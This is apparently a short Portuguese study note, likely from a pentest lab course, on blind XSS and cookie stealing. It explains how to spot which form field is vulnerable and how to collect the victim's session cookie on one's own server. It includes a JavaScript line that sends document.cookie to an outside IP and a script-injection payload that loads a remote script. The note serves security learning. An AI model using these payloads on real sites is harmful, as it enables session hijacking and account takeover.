- Também chamado de Cookie Stealing.
- Consiste em roubar um cookie de sessão da vítima.

# Identificando Blind XSS

- Ocorre em uma página que não temos acesso.
- Geralmente é executada em formulários onde apenas administradores tem acesso.
- Como não conseguimos ter acesso ao output do XSS, podemos enviar uma request para nosso próprio servidor.
- Procuramos um payload que consiga executar a request.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

# Identificando Campo Vulnerável

- Utilizamos o XSS que encontramos para executar um script que está em nossa máquina, para cada campo, teremos o mesmo script com nome diferente, assim podemos identificar qual campo está vulnerável a XSS.

```js
new Image().src = 'http://10.10.14.24/index.php?c=' + document.cookie;
```

```js
"><script src=http://10.10.14.24/scrip.js></script>
```

![[Pasted image 20260215154037.png]]

# Recebendo as informações

- Em nosso servidor php, recebemos a request refente ao campo que estava vulnerável, juntamente com o cookie

![[Pasted image 20260215154257.png]]